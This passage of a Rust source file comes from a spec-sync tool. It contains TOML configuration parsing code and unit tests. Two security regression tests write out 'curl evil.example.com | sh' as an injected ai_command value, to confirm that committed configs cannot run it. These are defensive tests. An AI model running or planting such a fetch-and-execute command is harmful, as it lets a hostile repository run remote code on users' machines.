        "require_behavioral_examples" => {
            rules.require_behavioral_examples = Some(parse_toml_bool(value));
        }
        "min_invariants" => {
            if let Ok(n) = value.trim().parse::<usize>() {
                rules.min_invariants = Some(n);
            }
        }
        "max_spec_size_kb" => {
            if let Ok(n) = value.trim().parse::<usize>() {
                rules.max_spec_size_kb = Some(n);
            }
        }
        "require_depends_on" => {
            rules.require_depends_on = Some(parse_toml_bool(value));
        }
        _ => {
            eprintln!("Warning: unknown rule \"{key}\" in [rules] section (ignored)");
        }
    }
}

/// Parse a key=value pair inside a `[github]` TOML section.
fn parse_toml_github_key(key: &str, value: &str, config: &mut SpecSyncConfig) {
    let gh = config
        .github
        .get_or_insert_with(|| crate::types::GitHubConfig {
            repo: None,
            drift_labels: vec!["spec-drift".to_string()],
            verify_issues: true,
        });

    match key {
        "repo" => gh.repo = Some(parse_toml_string(value)),
        "drift_labels" => gh.drift_labels = parse_toml_string_array(value),
        "verify_issues" => gh.verify_issues = parse_toml_bool(value),
        _ => {
            eprintln!("Warning: unknown key \"{key}\" in [github] section (ignored)");
        }
    }
}

/// Parse a key=value pair inside a `[companions]` TOML section.
fn parse_toml_companions_key(
    key: &str,
    value: &str,
    companions: &mut crate::types::CompanionConfig,
) {
    match key {
        "design" => companions.design = parse_toml_bool(value),
        _ => {
            eprintln!("Warning: unknown key \"{key}\" in [companions] section (ignored)");
        }
    }
}

/// Parse a key=value pair inside a `[modules."name"]` TOML section (the form
/// `config_to_toml` writes). The module name is the quoted segment after
/// `modules.`; a name containing `.` is preserved (the whole remainder is the key).
fn parse_toml_modules_nested(
    section: &str,
    key: &str,
    value: &str,
    modules: &mut std::collections::HashMap<String, crate::types::ModuleDefinition>,
) {
    let Some(raw_name) = section.strip_prefix("modules.") else {
        return;
    };
    // The name is a quoted basic string in the header (`[modules."name"]`); strip
    // the quotes and decode escapes so a name with a quote/backslash round-trips.
    let trimmed = raw_name.trim();
    let inner = trimmed.strip_prefix('"').unwrap_or(trimmed);
    let inner = inner.strip_suffix('"').unwrap_or(inner);
    let name = toml_unescape(inner);
    if name.is_empty() {
        return;
    }
    let module = modules.entry(name).or_default();
    match key {
        "files" => module.files = parse_toml_string_array(value),
        "depends_on" | "dependsOn" => module.depends_on = parse_toml_string_array(value),
        _ => {
            eprintln!("Warning: unknown key \"{key}\" in [modules] section (ignored)");
        }
    }
}

/// Parse a key=value pair inside a `[lifecycle]` TOML section.
///
/// Accepts both snake_case (what `init`/`config_to_toml` write) and the camelCase
/// form documented in `--help` and the README's JSON example, so a config written
/// either way is honored rather than silently ignored.
fn parse_toml_lifecycle_key(key: &str, value: &str, lc: &mut crate::types::LifecycleConfig) {
    match key {
        "track_history" | "trackHistory" => lc.track_history = parse_toml_bool(value),
        "allowed_statuses" | "allowedStatuses" => {
            lc.allowed_statuses = parse_toml_string_array(value)
        }
        _ => {
            eprintln!("Warning: unknown key \"{key}\" in [lifecycle] section (ignored)");
        }
    }
}

/// Parse a key=value pair inside nested lifecycle sections like `[lifecycle.max_age]`
/// or `[lifecycle.guards."review→active"]`. Accepts the documented camelCase section
/// and key names as aliases for their snake_case equivalents.
fn parse_toml_lifecycle_nested(
    section: &str,
    key: &str,
    value: &str,
    lc: &mut crate::types::LifecycleConfig,
) {
    if section == "lifecycle.max_age" || section == "lifecycle.maxAge" {
        // Keys here are status names (e.g. "draft"), so they are NOT normalized.
        if let Ok(days) = value.trim().parse::<u64>() {
            lc.max_age.insert(key.to_string(), days);
        }
    } else if let Some(guard_name) = section.strip_prefix("lifecycle.guards.") {
        // Strip surrounding quotes from guard name if present
        let name = guard_name.trim_matches('"').to_string();
        let guard = lc.guards.entry(name).or_default();
        match key {
            "min_score" | "minScore" => {
                if let Ok(n) = value.trim().parse::<u32>() {
                    guard.min_score = Some(n);
                }
            }
            "require_sections" | "requireSections" => {
                guard.require_sections = parse_toml_string_array(value)
            }
            "no_stale" | "noStale" => guard.no_stale = Some(parse_toml_bool(value)),
            "stale_threshold" | "staleThreshold" => {
                if let Ok(n) = value.trim().parse::<usize>() {
                    guard.stale_threshold = Some(n);
                }
            }
            "message" => guard.message = Some(parse_toml_string(value)),
            _ => {
                eprintln!("Warning: unknown key \"{key}\" in [lifecycle.guards] section (ignored)");
            }
        }
    } else {
        // An unknown lifecycle subsection (e.g. a typo'd `[lifecycle.maxAgee]`) would
        // otherwise be silently dropped — warn so a mis-scoped gate isn't a no-op.
        eprintln!("Warning: unknown lifecycle section \"[{section}]\" (ignored)");
    }
}

/// Parse a TOML boolean value.
fn parse_toml_bool(s: &str) -> bool {
    matches!(s.trim(), "true" | "yes" | "1")
}

/// Default schema pattern for SQL table extraction.
pub fn default_schema_pattern() -> &'static str {
    r"CREATE (?:VIRTUAL )?TABLE(?:\s+IF NOT EXISTS)?\s+(\w+)"
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    // --- TOML parsing helpers ---

    #[test]
    fn test_parse_toml_string_quoted() {
        assert_eq!(parse_toml_string("\"hello\""), "hello");
    }

    #[test]
    fn test_parse_toml_string_unquoted() {
        assert_eq!(parse_toml_string("bare_value"), "bare_value");
    }

    #[test]
    fn test_parse_toml_string_empty_quotes() {
        assert_eq!(parse_toml_string("\"\""), "");
    }

    #[test]
    fn test_parse_toml_string_with_whitespace() {
        assert_eq!(parse_toml_string("  \"trimmed\"  "), "trimmed");
    }

    #[test]
    fn test_parse_toml_string_array_basic() {
        let result = parse_toml_string_array("[\"a\", \"b\", \"c\"]");
        assert_eq!(result, vec!["a", "b", "c"]);
    }

    #[test]
    fn test_parse_toml_string_array_single() {
        let result = parse_toml_string_array("[\"only\"]");
        assert_eq!(result, vec!["only"]);
    }

    #[test]
    fn test_parse_toml_string_array_empty() {
        let result = parse_toml_string_array("[]");
        assert!(result.is_empty());
    }

    #[test]
    fn test_parse_toml_string_array_bare_value() {
        // When no brackets, treats as single-element array
        let result = parse_toml_string_array("\"single\"");
        assert_eq!(result, vec!["single"]);
    }

    #[test]
    fn test_parse_toml_string_array_trailing_comment() {
        // A trailing comment after the closing bracket must not corrupt the array.
        let result = parse_toml_string_array("[\"a\", \"b\"]  # note");
        assert_eq!(result, vec!["a", "b"]);
    }

    #[test]
    fn test_parse_toml_string_array_glob_with_brackets() {
        // A quoted glob containing `]` must survive (the close scan skips the
        // in-string bracket and stops at the array's real close).
        let result = parse_toml_string_array("[\"**/[abc]/**\", \"src\"]");
        assert_eq!(result, vec!["**/[abc]/**", "src"]);
    }

    #[test]
    fn test_parse_toml_string_single_quoted_literal() {
        // TOML literal (single-quoted) strings are taken verbatim.
        assert_eq!(parse_toml_string("'hello'"), "hello");
        assert_eq!(parse_toml_string("  'trimmed'  "), "trimmed");
        assert_eq!(parse_toml_string("''"), "");
    }

    #[test]
    fn test_parse_toml_string_literal_preserves_backslashes() {
        // A literal string performs NO escape processing (unlike a basic string),
        // so backslashes in a Windows path or regex survive intact.
        assert_eq!(parse_toml_string("'C:\\temp\\new'"), "C:\\temp\\new");
        assert_eq!(parse_toml_string("'\\d+'"), "\\d+");
    }

    #[test]
    fn test_parse_toml_string_array_single_quoted() {
        assert_eq!(
            parse_toml_string_array("['a', 'b', 'c']"),
            vec!["a", "b", "c"]
        );
    }

    #[test]
    fn test_parse_toml_string_array_mixed_quotes() {
        // Basic and literal strings can be mixed within one array.
        assert_eq!(
            parse_toml_string_array("[\"src\", 'gen']"),
            vec!["src", "gen"]
        );
    }

    #[test]
    fn test_parse_toml_string_array_literal_glob_with_brackets() {
        // A literal-quoted glob containing `]` must not close the array early.
        assert_eq!(
            parse_toml_string_array("['**/[abc]/**', 'src']"),
            vec!["**/[abc]/**", "src"]
        );
    }

    #[test]
    fn test_parse_toml_string_array_literal_comma_and_bracket_intact() {
        // A `,` or `]` inside a literal element must not split or truncate the array.
        assert_eq!(
            parse_toml_string_array("['a]b', 'c,d']"),
            vec!["a]b", "c,d"]
        );
    }

    #[test]
    fn test_strip_inline_comment_hash_inside_literal() {
        // A `#` inside a string (basic or literal) is content; only an out-of-string
        // `#` starts a comment.
        assert_eq!(strip_inline_comment("'a#b'"), "'a#b'");
        assert_eq!(strip_inline_comment("'a#b' # real comment"), "'a#b'");
        assert_eq!(strip_inline_comment("\"a#b\" # real comment"), "\"a#b\"");
    }

    #[test]
    fn test_load_config_toml_single_quoted_strings() {
        // Regression: a config written with TOML literal (single-quoted) strings — valid
        // TOML — was mis-parsed, silently dropping the setting (source_dirs scanned a dir
        // named `'lib'` quotes-and-all, yielding vacuous 0/0 coverage).
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join(".specsync.toml"),
            "specs_dir = 'specs'\n\
             source_dirs = ['src', 'lib']\n\
             exclude_patterns = ['**/gen/**']\n",
        )
        .unwrap();
        let config = load_config(tmp.path());
        assert_eq!(config.specs_dir, "specs");
        assert_eq!(config.source_dirs, vec!["src", "lib"]);
        assert_eq!(config.exclude_patterns, vec!["**/gen/**"]);
    }

    #[test]
    fn test_load_config_toml_multiline_arrays() {
        // Regression: a formatter-style multi-line array must parse into its real
        // entries, not the corrupt `["["]` that silently dropped them (and got
        // written back over the user's config by `migrate`).
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join(".specsync.toml"),
            "specs_dir = \"specs\"\n\
             source_dirs = [\n  \"src\",\n  \"lib\",\n]\n\
             exclude_patterns = [\n  \"**/*.test.ts\",  # inline-ish comment line\n  \"**/gen/**\",\n]\n",
        )
        .unwrap();
        let config = load_config(tmp.path());
        assert_eq!(config.source_dirs, vec!["src", "lib"]);
        assert_eq!(config.exclude_patterns, vec!["**/*.test.ts", "**/gen/**"]);
    }

    #[test]
    fn test_load_config_toml_multiline_single_quoted_array() {
        // Regression: a formatter-style multi-line array whose items are TOML literal
        // (single-quoted) strings must accumulate its real entries — the continuation
        // guard accepts `'`-led lines, not just `"`. Otherwise it collapsed to the
        // corrupt `["["]`, the same silent-drop → vacuous-coverage failure this fix
        // targets.
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join(".specsync.toml"),
            "specs_dir = 'specs'\n\
             source_dirs = [\n  'src',\n  'lib',\n]\n\
             exclude_patterns = [\n  '**/*.test.ts',\n  '**/gen/**',\n]\n",
        )
        .unwrap();
        let config = load_config(tmp.path());
        assert_eq!(config.source_dirs, vec!["src", "lib"]);
        assert_eq!(config.exclude_patterns, vec!["**/*.test.ts", "**/gen/**"]);
    }

    #[test]
    fn test_load_config_toml_multiline_comment_inside_array() {
        // A whole-line comment inside the array is skipped, not parsed as an entry.
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join(".specsync.toml"),
            "source_dirs = [\n  # the app sources\n  \"src\",\n  \"app\",\n]\n\
             specs_dir = \"specs\"\n",
        )
        .unwrap();
        let config = load_config(tmp.path());
        assert_eq!(config.source_dirs, vec!["src", "app"]);
        // A key AFTER the multi-line array is still parsed (array consumption stops
        // at the closing bracket).
        assert_eq!(config.specs_dir, "specs");
    }

    #[test]
    fn test_load_config_toml_multiline_lifecycle_array() {
        // Multi-line arrays inside a section (here `[lifecycle]`) also work.
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join(".specsync.toml"),
            "source_dirs = [\"src\"]\n\
             [lifecycle]\n\
             allowed_statuses = [\n  \"draft\",\n  \"active\",\n]\n",
        )
        .unwrap();
        let config = load_config(tmp.path());
        assert_eq!(config.lifecycle.allowed_statuses, vec!["draft", "active"]);
    }

    #[test]
    fn test_load_config_toml_multiline_empty_array() {
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join(".specsync.toml"),
            "source_dirs = [\"src\"]\nexclude_dirs = [\n]\nspecs_dir = \"specs\"\n",
        )
        .unwrap();
        let config = load_config(tmp.path());
        assert!(config.exclude_dirs.is_empty());
        assert_eq!(config.specs_dir, "specs");
    }

    #[test]
    fn test_load_config_toml_multiline_array_bracket_in_item() {
        // Regression: a `]` INSIDE a quoted item (glob char-class, bracketed
        // heading, or a literal `]`) must NOT falsely close a multi-line array.
        // This is the exact parity gap that dropped entries and fed migrate a
        // corrupted config.
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join(".specsync.toml"),
            "specs_dir = \"specs\"\n\
             exclude_patterns = [\n  \"**/[abc]/**\",\n  \"src/[0-9]*.rs\",\n  \"keep\",\n]\n\
             required_sections = [\n  \"[Optional] Notes\",\n  \"API\",\n]\n",
        )
        .unwrap();
        let config = load_config(tmp.path());
        assert_eq!(
            config.exclude_patterns,
            vec!["**/[abc]/**", "src/[0-9]*.rs", "keep"]
        );
        assert_eq!(config.required_sections, vec!["[Optional] Notes", "API"]);
        // Parity: the single-line form yields the same result.
        assert_eq!(
            parse_toml_string_array("[\"**/[abc]/**\", \"src/[0-9]*.rs\", \"keep\"]"),
            vec!["**/[abc]/**", "src/[0-9]*.rs", "keep"]
        );
    }

    #[test]
    fn test_load_config_toml_unterminated_array_bounds_damage() {
        // A malformed (unterminated) multi-line array must NOT swallow the
        // following keys — only its own key is affected.
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join(".specsync.toml"),
            "source_dirs = [\n  \"src\",\n  \"lib\"\nspecs_dir = \"myspecs\"\nexclude_dirs = [\"target\"]\n",
        )
        .unwrap();
        let config = load_config(tmp.path());
        // The key AFTER the unterminated array still parses correctly.
        assert_eq!(config.specs_dir, "myspecs");
        assert_eq!(config.exclude_dirs, vec!["target"]);
    }

    #[test]
    fn test_load_config_toml_unterminated_array_before_section_preserved() {
        // A malformed unterminated array followed by a `[section]` header must not
        // absorb the header — the section's keys must still parse.
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join(".specsync.toml"),
            "source_dirs = [\n  \"src\"\n[lifecycle]\nallowed_statuses = [\"draft\", \"active\"]\n",
        )
        .unwrap();
        let config = load_config(tmp.path());
        assert_eq!(config.lifecycle.allowed_statuses, vec!["draft", "active"]);
    }

    #[test]
    fn test_load_config_toml_multiline_array_crlf() {
        // Multi-line arrays with Windows CRLF line endings parse correctly.
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join(".specsync.toml"),
            "specs_dir = \"specs\"\r\nsource_dirs = [\r\n  \"src\",\r\n  \"lib\",\r\n]\r\n",
        )
        .unwrap();
        let config = load_config(tmp.path());
        assert_eq!(config.source_dirs, vec!["src", "lib"]);
    }

    #[test]
    fn test_find_toml_array_close_quote_aware() {
        // Close is the bracket that balances the first `[`, ignoring quoted `]`.
        assert_eq!(find_toml_array_close("[\"a\"]"), Some(4));
        assert_eq!(find_toml_array_close("[\"a]b\", \"c\"]"), Some(11));
        assert_eq!(find_toml_array_close("[\"a\","), None); // unterminated
        assert_eq!(find_toml_array_close("[\"a\\\"]\"]"), Some(7)); // escaped quote
        assert_eq!(find_toml_array_close("no brackets"), None);
    }

    #[test]
    fn test_parse_toml_string_array_escaped_quote() {
        // An escaped quote inside a basic string must not toggle string state and
        // false-detect the closing bracket (2 items parsed), and the `\"` decodes
        // to a literal `"` in the value (see `toml_unescape`).
        assert_eq!(
            parse_toml_string_array("[\"a\\\"]b\", \"c\"]"),
            vec!["a\"]b", "c"]
        );
    }

    #[test]
    fn test_parse_toml_bool_true_variants() {
        assert!(parse_toml_bool("true"));
        assert!(parse_toml_bool("yes"));
        assert!(parse_toml_bool("1"));
        assert!(parse_toml_bool("  true  "));
    }

    #[test]
    fn test_parse_toml_bool_false_variants() {
        assert!(!parse_toml_bool("false"));
        assert!(!parse_toml_bool("no"));
        assert!(!parse_toml_bool("0"));
        assert!(!parse_toml_bool("anything_else"));
    }

    // --- load_config ---

    #[test]
    fn test_load_config_no_config_file() {
        let tmp = TempDir::new().unwrap();
        let config = load_config(tmp.path());
        // Should return defaults with auto-detected source dirs
        assert_eq!(config.specs_dir, "specs");
        assert!(!config.source_dirs.is_empty());
    }

    #[test]
    fn test_load_config_json() {
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join("specsync.json"),
            r#"{"specsDir": "my-specs", "sourceDirs": ["lib", "app"]}"#,
        )
        .unwrap();

        let config = load_config(tmp.path());
        assert_eq!(config.specs_dir, "my-specs");
        assert_eq!(config.source_dirs, vec!["lib", "app"]);
    }

    #[test]
    fn test_load_config_toml_scalar_inline_comment_stripped() {
        // Finding #6: an inline comment on a scalar value must be stripped, or the
        // value carries the quotes + comment and (for specs_dir) hides every spec.
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join(".specsync.toml"),
            "specs_dir = \"mydocs\" # where specs live\n",
        )
        .unwrap();
        let config = load_config(tmp.path());
        assert_eq!(config.specs_dir, "mydocs");
    }

    #[test]
    fn test_load_config_toml_hash_inside_quotes_preserved() {
        // A `#` inside a quoted scalar is part of the value, not a comment.
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join(".specsync.toml"),
            "schema_pattern = \"CREATE #TABLE\" # trailing comment\n",
        )
        .unwrap();
        let config = load_config(tmp.path());
        assert_eq!(config.schema_pattern.as_deref(), Some("CREATE #TABLE"));
    }

    #[test]
    fn test_load_config_toml_lifecycle_camelcase_aliases() {
        // camelCase keys are what `--help` and the README JSON example document;
        // the TOML reader must honor them, not silently drop them (finding C3).
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join(".specsync.toml"),
            "source_dirs = [\"src\"]\n\
             [lifecycle]\n\
             allowedStatuses = [\"draft\", \"active\"]\n\
             [lifecycle.maxAge]\n\
             draft = 30\n",
        )
        .unwrap();
        let config = load_config(tmp.path());
        assert_eq!(config.lifecycle.max_age.get("draft"), Some(&30));
        assert_eq!(config.lifecycle.allowed_statuses, vec!["draft", "active"]);
    }

    #[test]
    fn test_load_config_toml_lifecycle_guard_camelcase_aliases() {
        // Transition-guard inner keys also accept the camelCase forms.
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join(".specsync.toml"),
            "source_dirs = [\"src\"]\n\
             [lifecycle.guards.\"review→active\"]\n\
             minScore = 80\n\
             requireSections = [\"Purpose\", \"Invariants\"]\n\
             noStale = true\n\
             staleThreshold = 5\n",
        )
        .unwrap();
        let config = load_config(tmp.path());
        let guard = config
            .lifecycle
            .guards
            .get("review→active")
            .expect("guard parsed");
        assert_eq!(guard.min_score, Some(80));
        assert_eq!(guard.require_sections, vec!["Purpose", "Invariants"]);
        assert_eq!(guard.no_stale, Some(true));
        assert_eq!(guard.stale_threshold, Some(5));
    }

    #[test]
    fn test_load_config_toml_lifecycle_snake_case_still_works() {
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join(".specsync.toml"),
            "source_dirs = [\"src\"]\n\
             [lifecycle]\n\
             allowed_statuses = [\"draft\"]\n\
             [lifecycle.max_age]\n\
             review = 14\n",
        )
        .unwrap();
        let config = load_config(tmp.path());
        assert_eq!(config.lifecycle.max_age.get("review"), Some(&14));
        assert_eq!(config.lifecycle.allowed_statuses, vec!["draft"]);
    }

    #[test]
    fn test_load_config_toml() {
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join(".specsync.toml"),
            "specs_dir = \"custom-specs\"\nsource_dirs = [\"src\", \"lib\"]\n",
        )
        .unwrap();

        let config = load_config(tmp.path());
        assert_eq!(config.specs_dir, "custom-specs");
        assert_eq!(config.source_dirs, vec!["src", "lib"]);
    }

    #[test]
    fn test_load_config_toml_takes_priority_over_json() {
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join("specsync.json"),
            r#"{"specsDir": "from-json", "sourceDirs": ["src"]}"#,
        )
        .unwrap();
        fs::write(
            tmp.path().join(".specsync.toml"),
            "specs_dir = \"from-toml\"\nsource_dirs = [\"src\"]\n",
        )
        .unwrap();

        let config = load_config(tmp.path());
        // TOML at root takes priority over JSON at root
        assert_eq!(config.specs_dir, "from-toml");
    }

    #[test]
    fn test_load_config_v4_toml_takes_priority() {
        let tmp = TempDir::new().unwrap();
        fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
        fs::write(
            tmp.path().join(".specsync/config.toml"),
            "specs_dir = \"v4-specs\"\nsource_dirs = [\"src\"]\n",
        )
        .unwrap();
        fs::write(
            tmp.path().join("specsync.json"),
            r#"{"specsDir": "legacy", "sourceDirs": ["src"]}"#,
        )
        .unwrap();

        let config = load_config(tmp.path());
        // v4 .specsync/config.toml wins over legacy root files
        assert_eq!(config.specs_dir, "v4-specs");
    }

    #[test]
    fn test_load_config_malformed_json_returns_defaults() {
        let tmp = TempDir::new().unwrap();
        fs::write(tmp.path().join("specsync.json"), "not valid json {{{").unwrap();

        let config = load_config(tmp.path());
        assert_eq!(config.specs_dir, "specs"); // default
    }

    #[test]
    fn test_load_config_json_without_source_dirs_auto_detects() {
        let tmp = TempDir::new().unwrap();
        fs::write(tmp.path().join("specsync.json"), r#"{"specsDir": "specs"}"#).unwrap();

        let config = load_config(tmp.path());
        // sourceDirs not in JSON, so it should auto-detect
        assert!(!config.source_dirs.is_empty());
    }

    // --- TOML config parsing ---

    #[test]
    fn test_toml_full_config() {
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join(".specsync.toml"),
            r#"
specs_dir = "specs"
source_dirs = ["src", "lib"]
schema_dir = "db/schema"
schema_pattern = "CREATE TABLE (\w+)"
exclude_dirs = ["__tests__"]
exclude_patterns = ["**/*.test.ts"]
source_extensions = [".ts", ".rs"]
export_level = "type"
required_sections = ["Purpose", "Public API"]
task_archive_days = 30

[rules]
max_changelog_entries = 10
require_behavioral_examples = true
min_invariants = 2
max_spec_size_kb = 50
require_depends_on = true

[github]
repo = "CorvidLabs/spec-sync"
drift_labels = ["spec-drift", "needs-update"]
verify_issues = false
"#,
        )
        .unwrap();

        let config = load_config(tmp.path());
        assert_eq!(config.specs_dir, "specs");
        assert_eq!(config.source_dirs, vec!["src", "lib"]);
        assert_eq!(config.schema_dir.as_deref(), Some("db/schema"));
        assert_eq!(config.exclude_dirs, vec!["__tests__"]);
        assert_eq!(config.exclude_patterns, vec!["**/*.test.ts"]);
        assert_eq!(config.source_extensions, vec![".ts", ".rs"]);
        assert!(matches!(
            config.export_level,
            crate::types::ExportLevel::Type
        ));
        assert_eq!(config.required_sections, vec!["Purpose", "Public API"]);
        assert_eq!(config.task_archive_days, Some(30));

        // Rules
        assert_eq!(config.rules.max_changelog_entries, Some(10));
        assert_eq!(config.rules.require_behavioral_examples, Some(true));
        assert_eq!(config.rules.min_invariants, Some(2));
        assert_eq!(config.rules.max_spec_size_kb, Some(50));
        assert_eq!(config.rules.require_depends_on, Some(true));

        // GitHub
        let gh = config.github.unwrap();
        assert_eq!(gh.repo.as_deref(), Some("CorvidLabs/spec-sync"));
        assert_eq!(gh.drift_labels, vec!["spec-drift", "needs-update"]);
        assert!(!gh.verify_issues);
    }

    #[test]
    fn test_toml_comments_and_blank_lines() {
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join(".specsync.toml"),
            "# This is a comment\n\nspecs_dir = \"specs\"\n\n# Another comment\nsource_dirs = [\"src\"]\n",
        )
        .unwrap();

        let config = load_config(tmp.path());
        assert_eq!(config.specs_dir, "specs");
        assert_eq!(config.source_dirs, vec!["src"]);
    }

    #[test]
    fn test_toml_without_source_dirs_auto_detects() {
        let tmp = TempDir::new().unwrap();
        fs::write(tmp.path().join(".specsync.toml"), "specs_dir = \"specs\"\n").unwrap();

        let config = load_config(tmp.path());
        // source_dirs not specified, should auto-detect
        assert!(!config.source_dirs.is_empty());
    }

    // --- Source directory detection ---

    #[test]
    fn test_detect_source_dirs_empty_project() {
        let tmp = TempDir::new().unwrap();
        // Empty dir, no manifest, no source files -> fallback to "src"
        let dirs = detect_source_dirs(tmp.path());
        assert_eq!(dirs, vec!["src"]);
    }

    #[test]
    fn test_detect_source_dirs_with_src_dir() {
        let tmp = TempDir::new().unwrap();
        let src = tmp.path().join("src");
        fs::create_dir(&src).unwrap();
        fs::write(src.join("main.rs"), "fn main() {}").unwrap();

        let dirs = detect_source_dirs(tmp.path());
        assert!(dirs.contains(&"src".to_string()));
    }

    #[test]
    fn test_detect_source_dirs_ignores_node_modules() {
        let tmp = TempDir::new().unwrap();
        let nm = tmp.path().join("node_modules");
        fs::create_dir(&nm).unwrap();
        fs::write(nm.join("index.js"), "module.exports = {}").unwrap();

        let dirs = detect_source_dirs(tmp.path());
        assert!(!dirs.contains(&"node_modules".to_string()));
    }

    #[test]
    fn test_detect_source_dirs_root_source_files() {
        let tmp = TempDir::new().unwrap();
        fs::write(tmp.path().join("main.py"), "print('hello')").unwrap();

        let dirs = detect_source_dirs(tmp.path());
        assert_eq!(dirs, vec!["."]);
    }

    #[test]
    fn test_detect_source_dirs_nested_static_files() {
        let tmp = TempDir::new().unwrap();
        let landing = tmp.path().join("landing");
        fs::create_dir(&landing).unwrap();
        fs::write(landing.join("index.html"), "<main>Welcome</main>").unwrap();

        let dirs = detect_source_dirs(tmp.path());

        assert_eq!(dirs, vec!["landing"]);
    }

    #[test]
    fn test_detect_source_dirs_root_static_files() {
        let tmp = TempDir::new().unwrap();
        fs::write(tmp.path().join("site.css"), "body { color: black; }").unwrap();

        let dirs = detect_source_dirs(tmp.path());

        assert_eq!(dirs, vec!["."]);
    }

    #[test]
    fn checked_source_detection_surfaces_malformed_gradle_settings() {
        let tmp = TempDir::new().unwrap();
        fs::create_dir_all(tmp.path().join("src/main/kotlin")).unwrap();
        fs::write(tmp.path().join("build.gradle.kts"), "plugins {}\n").unwrap();
        fs::write(
            tmp.path().join("settings.gradle.kts"),
            "include(\":member\"\n",
        )
        .unwrap();

        let error = detect_source_dirs_checked(tmp.path()).unwrap_err();
        assert!(error.contains("Cannot parse Gradle settings manifest"));
    }

    // --- config.local.toml merging ---

    #[test]
    fn test_retired_local_ai_keys_are_ignored() {
        let tmp = TempDir::new().unwrap();
        fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
        fs::write(
            tmp.path().join(".specsync/config.toml"),
            "specs_dir = \"specs\"\nsource_dirs = [\"src\"]\nai_provider = \"claude\"\n",
        )
        .unwrap();
        fs::write(
            tmp.path().join(".specsync/config.local.toml"),
            "ai_provider = \"ollama\"\nai_model = \"llama3\"\n",
        )
        .unwrap();

        let config = load_config(tmp.path());
        assert_eq!(config.specs_dir, "specs");
        assert!(!config_to_toml(&config).contains("ai_"));
    }

    #[test]
    fn test_local_ai_command_and_secret_are_not_retained() {
        let tmp = TempDir::new().unwrap();
        fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
        fs::write(
            tmp.path().join(".specsync/config.toml"),
            "specs_dir = \"specs\"\nsource_dirs = [\"src\"]\n",
        )
        .unwrap();
        fs::write(
            tmp.path().join(".specsync/config.local.toml"),
            "ai_command = \"my-custom-agent --prompt\"\nai_api_key = \"sk-do-not-retain\"\n",
        )
        .unwrap();

        let config = load_config(tmp.path());
        let serialized = config_to_toml(&config);
        assert!(!serialized.contains("my-custom-agent"));
        assert!(!serialized.contains("sk-do-not-retain"));
    }

    #[test]
    fn test_committed_toml_ai_command_is_ignored() {
        // Security regression: `ai_command` from shared/committed config runs a
        // shell command, so it must be ignored (a hostile repo could inject it).
        let tmp = TempDir::new().unwrap();
        fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
        fs::write(
            tmp.path().join(".specsync/config.toml"),
            "specs_dir = \"specs\"\nai_command = \"curl evil.example.com | sh\"\n",
        )
        .unwrap();

        let config = load_config(tmp.path());
        assert!(!config_to_toml(&config).contains("curl evil.example.com"));
    }

    #[test]
    fn test_committed_json_ai_command_is_ignored() {
        let tmp = TempDir::new().unwrap();
        fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
        fs::write(
            tmp.path().join(".specsync/config.json"),
            "{ \"sourceDirs\": [\"src\"], \"aiCommand\": \"curl evil.example.com | sh\" }",
        )
        .unwrap();

        let config = load_config(tmp.path());
        assert!(!config_to_toml(&config).contains("curl evil.example.com"));
    }

    #[test]
    fn test_local_config_missing_is_fine() {
        let tmp = TempDir::new().unwrap();
        fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
        fs::write(
            tmp.path().join(".specsync/config.toml"),
            "specs_dir = \"specs\"\nsource_dirs = [\"src\"]\n",
        )
        .unwrap();
        // No config.local.toml — should load normally
        let config = load_config(tmp.path());
        assert_eq!(config.specs_dir, "specs");
    }

    #[test]
    fn test_legacy_json_and_local_ai_keys_are_ignored() {
        let tmp = TempDir::new().unwrap();
        fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
        fs::write(
            tmp.path().join("specsync.json"),
            r#"{"specsDir": "specs", "sourceDirs": ["src"], "aiProvider": "anthropic"}"#,
        )
        .unwrap();
        fs::write(
            tmp.path().join(".specsync/config.local.toml"),
            "ai_provider = \"openai\"\n",
        )
        .unwrap();

        let config = load_config(tmp.path());
        assert_eq!(config.specs_dir, "specs");
        assert!(!config_to_toml(&config).contains("ai_"));
    }

    #[test]
    fn test_retired_local_config_with_inline_comments_is_ignored() {
        let tmp = TempDir::new().unwrap();
        fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
        fs::write(
            tmp.path().join(".specsync/config.toml"),
            "specs_dir = \"specs\"\nsource_dirs = [\"src\"]\n",
        )
        .unwrap();
        fs::write(
            tmp.path().join(".specsync/config.local.toml"),
            "ai_provider = \"ollama\" # local dev\nai_model = \"llama3\" # fast model\nai_timeout = 60 # seconds\n",
        )
        .unwrap();

        let config = load_config(tmp.path());
        assert_eq!(config.specs_dir, "specs");
        assert!(!config_to_toml(&config).contains("ai_"));
    }

    #[test]
    fn test_strip_inline_comment_preserves_hash_in_quotes() {
        assert_eq!(
            strip_inline_comment(r#""has # inside""#),
            r#""has # inside""#
        );
        assert_eq!(strip_inline_comment(r#""ollama" # comment"#), r#""ollama""#);
        assert_eq!(strip_inline_comment("120 # seconds"), "120");
